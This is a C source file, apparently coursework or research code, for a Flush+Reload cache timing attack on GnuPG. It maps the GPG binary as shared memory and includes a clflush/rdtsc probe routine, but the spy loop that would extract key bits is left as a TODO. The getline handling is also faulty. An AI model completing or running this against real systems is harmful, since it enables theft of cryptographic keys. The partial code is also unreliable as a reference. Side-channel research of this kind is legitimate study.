#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

// Roughly 4 MB. Always ensure that the executable is smaller than this
#define GPG_MAX_SIZE_BYTES 4194304

// See paper for the threshold of probe()
#define PROBE_THRESHOLD 120ul

// Maximum number of addresses to probe
#define MAX_NUM_OF_ADDRS 10u

/** Keeps track of arguments passed from terminal */
struct args_st {
    /** File descriptor of GPG binary */
    int gpg_fd;

    /** FILE stream of file containing addresses to probe */
    FILE *addr_file;
};

/** Read arguments into the args_st struct. */
bool read_args(struct args_st *arguments, int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s GPGpath addrfile\n", argv[0]);
        goto fail;
    }

    char *gpg_path = argv[1];
    if ((arguments->gpg_fd = open(gpg_path, O_RDONLY)) == -1) {
        perror("open");
        goto fail;
    }

    char *addr_path = argv[2];
    if ((arguments->addr_file = fopen(addr_path, "r")) == NULL) {
        perror("fopen");
        goto addr_fail;
    }

    return true;

    // Trust me, goto isn't harmful :)
addr_fail:
    close(arguments->gpg_fd);
fail:
    return false;
}

void cleanup_args(struct args_st *arguments) {
    close(arguments->gpg_fd);
    fclose(arguments->addr_file);
}

size_t read_addrs(FILE *addr_file, char **addrs, size_t maxlen) {
    size_t linecap = 24;
    ssize_t linelen = 0;
    char *line;

    if ((linelen = getline(&line, &linecap, addr_file)) == 0) {
        return 0;
    }
    line[linelen - 1] = '\0';  //replace \n with \0

    char *endptr;
    size_t num_addrs = strtol(line, &endptr, 10);
    if (*endptr != '\0') {
        fprintf(stderr, "error parsing first line of file: %s\n", line);
        return 0;
    }

    if (num_addrs > maxlen) {
        fprintf(stderr, "maxlen needs to be > %lu\n", num_addrs);
        return 0;
    }

    for (size_t i = 0; i < num_addrs; i++) {
        if ((linelen = getline(&line, &linecap, addr_file)) == 0) {
            return 0;
        }
        line[linelen - 1] = '\0';

        // First two characters are '0x'
        // Also, cast to a pointer. (not sure why it's `char *`)
        char *addr = (char *)strtol(&(line[2]), &endptr, 16);
        if (*endptr != '\0') {
            fprintf(stderr, "error parsing address %s\n", line);
            return 0;
        }
        addrs[i] = addr;
    }

    return num_addrs;
}

int probe(char *adrs) {
    volatile unsigned long time;

    asm __volatile__(
        "    mfence             \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    lfence             \n"
        "    movl %%eax, %%esi  \n"
        "    movl (%1), %%eax   \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    subl %%esi, %%eax  \n"
        "    clflush 0(%1)      \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx"
    );
    return time < PROBE_THRESHOLD;
}

void spy(void *gpg_base) {
    // TODO
}

int main(int argc, char *argv[]) {
    struct args_st arguments;
    if (!read_args(&arguments, argc, argv)) {
        return 1;
    }

    // memory map so we can force OS to share this memory page with GPG process
    size_t map_len = GPG_MAX_SIZE_BYTES;
    void *gpg_base = mmap(NULL, map_len, PROT_READ, MAP_FILE | MAP_SHARED,
            arguments.gpg_fd, 0);
    if (gpg_base == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    printf("GPG binary mmapped to %p\n", gpg_base);

    // NOTE: this is an array of pointers. The paper uses `char *` for this, but
    // I'm not sure yet if we can get away with using `void *` instead, which I
    // think is a lot easier to understand.
    char *addrs[MAX_NUM_OF_ADDRS];
    size_t num_addrs = read_addrs(arguments.addr_file, addrs, MAX_NUM_OF_ADDRS);
    if (num_addrs == 0) {
        fprintf(stderr, "Did not read any addresses from file\n");
        return 0;
    }

    printf("Probing %lu addresses:\n", num_addrs);
    for (size_t i = 0; i < num_addrs; i++) {
        printf("%p\n", addrs[i]);
    }

    printf("Here are the offset addresses (respectively):\n");
    for (size_t i = 0; i < num_addrs; i++) {
        // Here be dragons :O
        unsigned long ptr_offset = (unsigned long)gpg_base;
        char *adjusted_ptr = addrs[i] + ptr_offset;

        addrs[i] = adjusted_ptr;
        printf("%p\n", addrs[i]);
    }
    spy(gpg_base);

    // Probably never reached because we'll likely just ^C the program. Maybe
    // implement a SIGTERM / SIGINT handler?
    munmap(gpg_base, map_len);
    cleanup_args(&arguments);
    return 0;
}

